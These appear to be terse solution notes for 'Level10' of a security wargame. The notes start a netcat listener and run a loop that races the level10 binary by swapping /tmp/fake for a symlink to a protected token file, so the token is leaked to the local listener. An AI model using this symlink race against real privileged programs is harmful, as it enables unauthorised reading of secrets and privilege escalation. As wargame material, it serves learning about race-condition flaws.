# Level10 steps
nc -lk 6969
#### in another shell:
while true; do
  rm -f /tmp/fake
  touch /tmp/fake
  /home/user/level10/level10 /tmp/fake 127.0.0.1 &
  ln -sf /home/user/level10/token /tmp/fake
done